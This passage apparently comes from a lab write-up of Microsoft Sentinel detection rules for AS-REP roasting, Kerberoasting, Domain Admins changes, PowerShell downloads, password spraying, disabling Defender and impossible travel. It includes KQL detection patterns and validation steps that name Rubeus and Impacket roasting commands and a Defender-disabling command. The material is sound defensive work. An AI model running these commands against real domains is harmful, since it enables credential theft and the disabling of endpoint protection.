* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **IP**.

### Why group alerts by IP?
In a production environment, adversaries will use automated tools to roast every vulnerable account in the domain simultaneously. By grouping alerts by the originating IP Address, the SOC receives a single consolidated incident containing the entire roasting campaign, rather than a separate ticket for every individual account queried.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 181216" src="https://github.com/user-attachments/assets/8ada0676-4224-43b3-92bf-df995ad23107" />

---

## ✅ Validation
This detection can be validated by identifying an account with "Do not require Kerberos preauthentication" checked in Active Directory (e.g., `sqlsvc`), and running a tool like Impacket's `GetNPUsers.py` or Rubeus (`Rubeus.exe asreproast /user:sqlsvc`) from an attacking machine. Sentinel will capture the 4768 event and generate the incident.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 180839" src="https://github.com/user-attachments/assets/1eb42425-cc51-4bb9-a034-5eee987e0f19" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify adversaries attempting to extract encrypted password hashes from the network.
* Highlight misconfigured or highly vulnerable service accounts that require remediation (enabling Kerberos preauthentication).
* Detect the reconnaissance and initial credential access phase of an attack sequence before lateral movement occurs.

---




⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🎯 Kerberoasting Detection

## 🎯 Objective
This rule detects potential Kerberoasting attacks by monitoring for Kerberos Service Ticket (TGS) requests (Event ID 4769) targeting specific service accounts. It alerts security teams to adversaries attempting to harvest service account password hashes for offline cracking.

---

## 📖 Threat Overview
Kerberoasting is a post-compromise credential access technique. An adversary who has already obtained a valid standard domain user account can request a Kerberos Service Ticket (TGS) for any account that has a registered Service Principal Name (SPN). The Domain Controller responds with a ticket containing a portion encrypted with the service account's password hash. The attacker extracts this ticket and uses offline cracking tools (like Hashcat or John the Ripper) to reveal the plaintext password. Because service accounts often have elevated or Domain Admin privileges, this is a critical escalation path.

---

## 🔥 Severity
**High**
<img width="1920" height="1020" alt="Screenshot 2026-08-03 181932" src="https://github.com/user-attachments/assets/bf1d8157-3dc3-4ce8-b90c-b07682a5a6a5" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4769 - A Kerberos service ticket was requested)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for Kerberos TGS requests targeting a specific service account (Note: The `sqlsvc` filter is configured specifically for targeted lab environment detection):

    SecurityEvent
    | where EventID == 4769
    | where EventData contains "ServiceName"
    | where EventData contains "sqlsvc"
    | project TimeGenerated, Computer, Account, EventData, IpAddress

<img width="1920" height="1020" alt="Screenshot 2026-08-03 182004" src="https://github.com/user-attachments/assets/916029ec-84b4-4a5c-8703-12523192d0c6" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect credential access attempts the moment a service ticket is requested. |
| **Severity** | High | Successful Kerberoasting can rapidly lead to domain privilege escalation. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual TGS ticket request matching the criteria. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| IP | Address | IpAddress |

### Why map these entities?
* **Account:** Identifies the compromised user account making the TGS request.
* **Host:** Highlights the Domain Controller or system processing the ticket request.
* **IP:** Traces the network origin of the attacker initiating the Kerberoasting requests.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 182020" src="https://github.com/user-attachments/assets/318cb93b-067e-45a3-a810-f278d1031eff" />

---

## 🔄 Detection Workflow

    Attacker requests a TGS for a vulnerable Service Principal Name (SPN)
                │
                ▼
    Domain Controller logs Event ID 4769 (Service Ticket Requested)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    EventData contains the targeted service account ("sqlsvc")
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by Source IP)
                │
                ▼
    SOC Analyst Assigned & Account Password Reset Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4769** is logged.
* The `EventData` field contains the string `"ServiceName"`.
* The `EventData` field contains the specific string `"sqlsvc"` (the targeted service account).

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **IP**.

### Why group alerts by IP?
In a production environment, attackers use automated scripts (like Invoke-Kerberoast) to request tickets for *all* vulnerable SPNs in the domain at once. Grouping by IP Address ensures that a massive burst of 4769 events from a single compromised endpoint is bundled into a single, actionable incident ticket for the SOC, drastically reducing alert fatigue.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 182037" src="https://github.com/user-attachments/assets/d4e45747-8e07-4a2c-8301-c1e312e78181" />

---

## ✅ Validation
This detection can be validated by running an SPN extraction and TGS request tool like Rubeus (`Rubeus.exe kerberoast /user:sqlsvc`) or Impacket (`GetUserSPNs.py`) from an attacking machine within the lab environment against the `sqlsvc` account. Microsoft Sentinel will capture the 4769 event and generate the incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 182047" src="https://github.com/user-attachments/assets/29d323de-d3e5-41f8-b1d2-d58c4ce9584e" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify internal reconnaissance and credential harvesting against service accounts.
* Track the exact source IP address of the compromised machine performing the attack.
* Highlight weak points in the domain's service account structure (e.g., service accounts with weak passwords that are vulnerable to offline cracking).

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 👑 User Added to Domain Admins

## 🎯 Objective
This rule detects when a user account is added to the Domain Admins security group. It alerts security teams to potential privilege escalation or unauthorized administrative access, which are critical indicators of domain compromise.

---

## 📖 Threat Overview
The Domain Admins group holds unrestricted access to the entire Active Directory domain. Once threat actors compromise a standard account and find an escalation path, their primary goal is often to add themselves (or a backdoor account they control) to the Domain Admins group. This provides them with complete persistence and the ability to move laterally to any system, access sensitive data, and manipulate domain security policies.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 183346" src="https://github.com/user-attachments/assets/34cb86c6-1aaf-4d0c-8f4e-b6fdf190d197" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Persistence, Privilege Escalation | Account Manipulation | T1098 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4728 - A member was added to a security-enabled global group)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for additions to the Domain Admins group by matching the known Security Identifier (SID) pattern for Domain Admins (`-512`) or the group name directly:

    SecurityEvent
    | where EventID == 4728
    | where TargetSid == "S-1-5-21-*-512" or TargetUserName =~ "Domain Admins"
    | project
        TimeGenerated,
        Computer,
        SubjectAccount = SubjectUserName,
        AddedUser = MemberName,
        GroupName = TargetUserName,
        Activity

<img width="1920" height="1020" alt="Screenshot 2026-08-03 183426" src="https://github.com/user-attachments/assets/1644f6da-8f79-487b-9fdf-05b7f1d112d9" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect domain privilege escalation the second it occurs. |
| **Severity** | High | Unauthorized addition to Domain Admins is a critical, domain-level security breach. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Every addition to this group requires immediate, independent verification. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators. *(Note: Configured to track the administrator performing the action and the host where the change occurred).*

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | SubjectAccount |
| Host | HostName | Computer |

### Why map these entities?
* **Account (SubjectAccount):** Identifies the administrator (or compromised admin account) that performed the action.
* **Host:** Highlights the Domain Controller where the group modification was processed.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 183725" src="https://github.com/user-attachments/assets/ee1f8bce-8312-457e-a0e8-a54dc856bb8e" />

---

## 🔄 Detection Workflow

    Attacker escalates privileges and adds a backdoor account to Domain Admins
                │
                ▼
    Domain Controller logs Event ID 4728 (Member added to global group)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    TargetSid matches "-512" (Domain Admins SID)
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (No alert grouping)
                │
                ▼
    SOC Analyst Assigned to verify authorization of the change

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4728** is logged.
* The `TargetSid` matches the pattern `"S-1-5-21-*-512"` OR the `TargetUserName` is case-insensitively matched to `"Domain Admins"`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Modifications to the Domain Admins group should be exceptionally rare in a healthy, mature IT environment. Because this represents the highest level of privilege escalation, the SOC must be notified immediately of *every* distinct occurrence without delay or grouping constraints.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 183455" src="https://github.com/user-attachments/assets/bc42650f-1323-4543-b70c-4b5fe131b97a" />

---

## ✅ Validation
This detection can be validated by logging into a Domain Controller with administrative privileges, opening Active Directory Users and Computers (ADUC) or an elevated PowerShell prompt, and temporarily adding a test user account to the Domain Admins group. Microsoft Sentinel will capture the 4728 event and immediately generate an incident. *(Ensure the test user is removed immediately after validation).*

<img width="1920" height="1020" alt="Screenshot 2026-08-03 183512" src="https://github.com/user-attachments/assets/caf58a5a-ca31-43f3-b541-a1bff95963fc" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify the final stages of privilege escalation attack chains.
* Detect rogue administrators or insider threats granting unauthorized access.
* Maintain strict auditing and compliance over the domain's most privileged security group.

---



⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# ⬇️ PowerShell Download

## 🎯 Objective
This rule detects PowerShell execution used specifically to download files from remote locations. It alerts security teams to potential Command and Control (C2) activity or ingress tool transfer.

---

## 📖 Threat Overview
Adversaries frequently use built-in Windows tools like PowerShell to download secondary payloads, scripts, or post-exploitation tools from remote infrastructure. By leveraging cmdlets like `Invoke-WebRequest` or .NET classes like `Net.WebClient`, attackers can bypass traditional web filtering and execute malicious code directly in memory or drop it to disk.

---

## 🔥 Severity
**High**
<img width="1920" height="1020" alt="Screenshot 2026-08-03 185017" src="https://github.com/user-attachments/assets/f1025369-2d1d-4b22-9e56-54b5a56a3641" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Command And Control | Ingress Tool Transfer | T1105 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for process creation events where the command line contains known PowerShell download syntax:

    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any (
        "Invoke-WebRequest",
        "iwr",
        "Start-BitsTransfer",
        "DownloadFile",
        "Net.WebClient"
      )
    | project TimeGenerated,
        Computer,
        Account,
        NewProcessName,
        CommandLine

<img width="1920" height="1020" alt="Screenshot 2026-08-03 185230" src="https://github.com/user-attachments/assets/96fdd1f9-d923-4795-83ea-ceb539a71677" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect malicious downloads the moment they occur. |
| **Severity** | High | Downloading unauthorized executables or scripts via PowerShell is a strong indicator of compromise. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of a download command. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| Process | CommandLine | CommandLine |

<img width="1920" height="1020" alt="Screenshot 2026-08-03 185249" src="https://github.com/user-attachments/assets/3000fcd6-e2f3-41af-8768-b6caf21a37f9" />

---

## 🔄 Detection Workflow

    Attacker executes a PowerShell command to download a payload
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    CommandLine matches download strings (e.g., "Invoke-WebRequest")
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by matching entities)
                │
                ▼
    SOC Analyst Assigned & Process Tree Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is logged.
* The `CommandLine` field contains any of the following strings: `"Invoke-WebRequest"`, `"iwr"`, `"Start-BitsTransfer"`, `"DownloadFile"`, or `"Net.WebClient"`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if all the entities match (recommended).

### Why group alerts by all matching entities?
If a malicious script executes multiple download commands in rapid succession on the same host using the same account and identical command line syntax, this setting consolidates them into a single incident, significantly reducing alert fatigue.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 185655" src="https://github.com/user-attachments/assets/b4fcba78-fdfa-4e03-94f5-7f87fe7e9076" />

---

## ✅ Validation
This detection can be validated by opening PowerShell on a monitored endpoint and executing a benign download command, such as `Invoke-WebRequest -Uri "https://example.com" -OutFile "C:\temp\test.txt"`. Microsoft Sentinel will capture the 4688 event containing the command and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 185836" src="https://github.com/user-attachments/assets/1705d2b5-42bf-4e17-a53a-85dce7f70e79" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify the delivery phase of malware or ransomware.
* Track the specific URLs or IP addresses attackers are using for Command and Control (C2).
* Isolate compromised hosts immediately upon detecting unauthorized ingress tool transfers.

---



⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

# 💦 Password Spray Detection

## 🎯 Objective
This rule detects password spraying attacks by monitoring for multiple failed authentication attempts across different user accounts originating from a single IP address within a short time window. 

---

## 📖 Threat Overview
Traditional brute-force attacks target a single account with many passwords, which easily triggers account lockout policies. To evade detection, adversaries use a "Password Spraying" technique: they take one common password (e.g., `Summer2026!`) and attempt to log in to *every* known account in the domain. Because each account only experiences one failed login, standard lockout thresholds are not triggered, allowing the attacker to slip under the radar while hunting for weak credentials.

---

## 🔥 Severity
**High**
<img width="1920" height="1020" alt="Screenshot 2026-08-03 191418" src="https://github.com/user-attachments/assets/7b460672-e315-40c7-848b-dd5fa2539042" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | Brute Force: Password Spraying | T1110.003 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4625 - An account failed to log on)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query aggregates failed logon events (excluding computer accounts ending in `$`) into 10-minute bins. It triggers if a single IP address fails to authenticate to 3 or more distinct user accounts within that window:

    SecurityEvent
    | where EventID == 4625
    | where TargetAccount !endswith "$"
    | summarize
        FailedUsers = dcount(TargetAccount),
        FailedAttempts = count(),
        TargetedAccounts = make_set(TargetAccount),
        FirstAttempt = min(TimeGenerated),
        LastAttempt = max(TimeGenerated)
        by IpAddress, Computer, bin(TimeGenerated, 10m)
    | where FailedUsers >= 3
    | project
        FirstAttempt,
        LastAttempt,
        Computer,
        IpAddress,
        FailedUsers,
        FailedAttempts,
        TargetedAccounts
<img width="1920" height="1020" alt="Screenshot 2026-08-03 191442" src="https://github.com/user-attachments/assets/d154dfd7-50f6-4c62-8522-b6b69f96e030" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Aggregates data over time windows rather than evaluating individual events instantly. |
| **Run Query Every** | 10 Minutes | Matches the `bin(TimeGenerated, 10m)` aggregation window in the query. |
| **Lookup Data From** | Last 11 Minutes | Provides a 1-minute overlap buffer to account for ingestion delays. |
| **Severity** | High | Successful credential access leads directly to lateral movement and privilege escalation. |
| **Status** | Enabled | Ensures the detection is currently active. |
<img width="1920" height="1020" alt="Screenshot 2026-08-03 191522" src="https://github.com/user-attachments/assets/8f814a50-c186-4ef1-8519-3b126ba24506" />

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators. 

| Entity | Identifier | Field |
|---------|------------|-------|
| IP | Address | IpAddress |
| Account | Name | TargetedAccounts |
| Host | HostName | Computer |

### Why map these entities?
* **IP:** Identifies the source machine performing the password spray.
* **Account:** Attaches the set of targeted accounts to the incident so the SOC knows exactly who was attacked. *(Note: Because `TargetedAccounts` is generated via `make_set`, Sentinel will map the array of targeted users to the incident).*
* **Host:** Identifies the Domain Controller or endpoint registering the failed authentication attempts.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 191513" src="https://github.com/user-attachments/assets/89787692-4672-40f8-941c-a419453070a7" />

---

## 🔄 Detection Workflow

    Attacker uses a tool to spray one password against 50 domain users
                │
                ▼
    Domain Controller logs Event ID 4625 (Failed Logon) for each attempt
                │
                ▼
    Azure Monitor Agent (AMA) ingests the events
                │
                ▼
    Microsoft Sentinel Scheduled Rule evaluates the last 11 minutes of logs
                │
                ▼
    Query counts >= 3 unique accounts failing from the same Source IP
                │
                ▼
    Alert Generated (Containing the set of all targeted accounts)
                │
                ▼
    Incident Created (Grouped by matching entities)
                │
                ▼
    SOC Analyst Assigned & Source IP Blocked / Account Review Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4625** is logged.
* The `TargetAccount` does not represent a machine account (does not end with `$`).
* The unique count (`dcount`) of `TargetAccount` values is **3 or greater** originating from the same `IpAddress` and `Computer` within a **10-minute** window.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Days.
* **Grouping Method:** Grouping alerts into a single incident if all the entities match.

### Why this grouping configuration?
Password sprays can sometimes be conducted "low and slow" over several days. By grouping alerts over a large 5-day window, the SOC can track persistent, repeated brute-force attempts from the same source IP against the same infrastructure in a single unified incident ticket.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 191549" src="https://github.com/user-attachments/assets/295b7c73-0f8e-4c63-8ef5-f9bf39d77073" />

---

## ✅ Validation
This detection can be validated in a lab environment by attempting to log in to 3 or more distinct, valid user accounts (e.g., `User1`, `User2`, `User3`) with incorrect passwords from the same attacking machine within a 10-minute window. Sentinel will aggregate the 4625 events and generate an incident pinpointing the attacking IP.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 191606" src="https://github.com/user-attachments/assets/9ec4e6cf-a2c5-4441-9077-fbf839bdc723" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify adversaries attempting to bypass standard account lockout thresholds.
* Reveal the scope of brute-force attacks by surfacing the exact list of targeted accounts.
* Rapidly identify and block malicious infrastructure (IPs) conducting automated credential attacks against the perimeter or internal network.

---


⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🛡️ Defender Disabled

## 🎯 Objective
This rule detects modifications in the registry or via the command line intended to disable Microsoft Defender. It alerts security teams to defense evasion tactics indicating an attacker is attempting to blind endpoint protections before executing malicious payloads.

---

## 📖 Threat Overview
Before dropping ransomware, establishing persistence, or running noisy post-exploitation frameworks, adversaries frequently attempt to disable local antivirus and Endpoint Detection and Response (EDR) solutions. By leveraging built-in Windows administrative tools like `sc.exe` or PowerShell cmdlets like `Set-MpPreference`, attackers can turn off real-time monitoring, behavioral analysis, and antispyware features to execute their payload undetected.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 213617" src="https://github.com/user-attachments/assets/7d4bea9a-19a3-43a2-a70b-f74be1759f52" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for process creation events where the command line contains known strings used to stop the Windows Defender service or disable its primary protection features:

    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any (
        "Set-MpPreference -DisableRealtimeMonitoring",
        "Set-MpPreference -DisableIOAVProtection",
        "Set-MpPreference -DisableBehaviorMonitoring",
        "Set-MpPreference -DisableAntiSpyware",
        "sc.exe stop WinDefend",
        "sc stop WinDefend"
    )
    | project TimeGenerated, Computer, Account, NewProcessName, CommandLine

<img width="1920" height="1020" alt="Screenshot 2026-08-03 213642" src="https://github.com/user-attachments/assets/705a3bc9-07b2-413d-bf6b-1e0a6429f175" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Runs on a consistent schedule to check for evasion commands. |
| **Run Query Every** | 5 Minutes | Ensures prompt detection of defense evasion to intercept payloads. |
| **Lookup Data From** | Last 6 Minutes | Provides a 1-minute overlap buffer to account for ingestion delays. |
| **Severity** | High | Intentionally disabling endpoint protection is a critical indicator of an active attack. |
| **Status** | Enabled | Ensures the detection is currently active. |
<img width="1920" height="1020" alt="Screenshot 2026-08-03 213706" src="https://github.com/user-attachments/assets/48fde0b3-c9be-47a4-bc66-486ff74d4342" />


---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Host:** Identifies the specific endpoint that is currently unprotected and vulnerable.
* **Account:** Identifies the compromised administrative account executing the commands.
* **Process:** Extracts the exact `CommandLine` used, revealing which specific Defender features the attacker attempted to disable.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 213653" src="https://github.com/user-attachments/assets/f18e4ef6-5c88-4fc1-99ba-c60e6e79fabf" />

---

## 🔄 Detection Workflow

    Attacker executes a command to disable Defender (e.g., sc stop WinDefend)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel Scheduled Rule evaluates the last 6 minutes of logs
                │
                ▼
    CommandLine matches known evasion strings
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by Account and Host)
                │
                ▼
    SOC Analyst Assigned & Endpoint Isolation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is logged.
* The `CommandLine` field contains specific `Set-MpPreference` directives disabling protections, or `sc` commands stopping the `WinDefend` service.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host**.

### Why group alerts by Account and Host?
Attackers or automated malware scripts will often run multiple commands in rapid succession to ensure various layers of Defender (Real-time monitoring, IOAV, Behavioral) are all completely disabled. Grouping by Account and Host consolidates these sequential commands into one actionable incident ticket for the SOC.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 213717" src="https://github.com/user-attachments/assets/b5065db7-6139-4090-97ad-6e1a624638c5" />

---

## ✅ Validation
This detection can be validated in a controlled lab environment by opening an elevated PowerShell prompt and executing `Set-MpPreference -DisableRealtimeMonitoring $true` (ensure you immediately revert this by running the same command with `$false`). Microsoft Sentinel will capture the 4688 event and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 213732" src="https://github.com/user-attachments/assets/99953099-e266-44c4-8e99-2e03c8d14ad0" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify the exact moment an endpoint loses its primary defense mechanisms.
* Catch attackers in the intermediary phase between initial access and payload execution.
* Quickly isolate blinded endpoints from the rest of the network before lateral movement or ransomware deployment can occur.

---


⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# ✈️ Impossible Travel

## 🎯 Objective
This rule detects user logins from geographically distant locations in an impossibly short timeframe. It alerts security teams to compromised credentials being used by an adversary in a different region than the legitimate user.

---

## 📖 Threat Overview
When credentials are stolen (via phishing, credential stuffing, or malware), threat actors often log in from their own infrastructure or a proxy network. If the legitimate user recently logged in from their home office in New York, and a successful login occurs 30 minutes later from a data center in Moscow, it is physically impossible for the user to have traveled that distance. This geographic velocity anomaly is a prime indicator of account takeover (Valid Accounts).

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214212" src="https://github.com/user-attachments/assets/0ba15276-d8e4-4171-9ca2-2e2a95787ce6" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Initial Access, Defense Evasion, Persistence, Privilege Escalation | Valid Accounts | T1078 |

---

## 📂 Data Sources
* Entra ID / Azure AD Sign-in Logs (`SigninLogs`)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query calculates the distance and time difference between sequential successful sign-ins for the same user. It triggers if the required travel speed exceeds a commercial flight threshold (900 km/h) and the distance is greater than 500 km (to filter out VPN/ISP routing noise):

    let TimeWindow = 1h; // adjust based on how far back you want to look
    let MaxSpeedKmh = 900; // ~commercial flight speed threshold
    SigninLogs
    | where TimeGenerated > ago(24h)
    | where ResultType == 0 // successful sign-ins only
    | extend Latitude = todouble(LocationDetails.geoCoordinates.latitude),
             Longitude = todouble(LocationDetails.geoCoordinates.longitude),
             City = tostring(LocationDetails.city),
             Country = tostring(LocationDetails.countryOrRegion)
    | where isnotempty(Latitude) and isnotempty(Longitude)
    | sort by UserPrincipalName asc, TimeGenerated asc
    | serialize
    | extend PrevTime = prev(TimeGenerated),
             PrevLat = prev(Latitude),
             PrevLong = prev(Longitude),
             PrevCity = prev(City),
             PrevCountry = prev(Country),
             PrevUser = prev(UserPrincipalName)
    | where UserPrincipalName == PrevUser
    | extend TimeDiffHours = datetime_diff('minute', TimeGenerated, PrevTime) / 60.0
    | where TimeDiffHours > 0 and TimeDiffHours < 24 // exclude stale/duplicate rows
    | extend DistanceKm = geo_distance_2points(PrevLong, PrevLat, Longitude, Latitude) / 1000
    | extend RequiredSpeedKmh = DistanceKm / TimeDiffHours
    | where RequiredSpeedKmh > MaxSpeedKmh
    | where DistanceKm > 500 // filter out noise from small distance/GPS jitter
    | project TimeGenerated, UserPrincipalName, PrevTime, PrevCity, PrevCountry,
              City, Country, DistanceKm, TimeDiffHours, RequiredSpeedKmh,
              IPAddress, AppDisplayName, DeviceDetail
    | order by RequiredSpeedKmh desc
<img width="1920" height="1020" alt="Screenshot 2026-08-03 214300" src="https://github.com/user-attachments/assets/744fa0d9-27bb-42b2-8d47-ba23fe56d9a9" />

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214308" src="https://github.com/user-attachments/assets/0a749d2d-116d-4d56-83d6-ffedcad8f041" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect geographic anomalies immediately. |
| **Severity** | High | Impossible travel on a successful login strongly indicates a compromised identity. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures distinct instances of anomalous geographic jumps. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| IP | Address | IPAddress |
| Account | Name | UserPrincipalName |

### Why map these entities?
* **Account:** Identifies the compromised user whose credentials are being abused from multiple locations.
* **IP:** Identifies the network origin of the anomalous authentication attempt.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214321" src="https://github.com/user-attachments/assets/948144c5-4a92-4912-94a6-724034919e9f" />

---

## 🔄 Detection Workflow

    User logs in successfully from City A
                │
                ▼
    Attacker logs in successfully with the same credentials from City B shortly after
                │
                ▼
    Entra ID logs the Sign-in events with geolocation data
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    Query calculates that traveling between City A and City B in the elapsed time requires > 900 km/h speed
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by matching entities)
                │
                ▼
    Automation Rule triggered (e.g., Change status for known IP)
                │
                ▼
